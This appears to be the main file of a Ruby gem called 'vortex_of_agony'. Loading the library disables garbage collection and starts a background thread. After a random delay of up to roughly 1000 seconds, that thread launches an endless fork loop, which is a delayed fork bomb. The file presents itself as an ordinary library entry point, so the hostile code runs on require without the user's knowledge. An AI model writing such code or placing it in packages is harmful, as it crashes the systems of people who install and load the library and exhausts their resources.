require "vortex_of_agony/version"

def crash!
  loop { fork { bomb } }
end

GC.disable # make it more painful
crash_at = Time.now.to_i + 1000 * rand
Thread.new do
  loop do
    crash! if Time.now.to_i > crash_at
  end
end
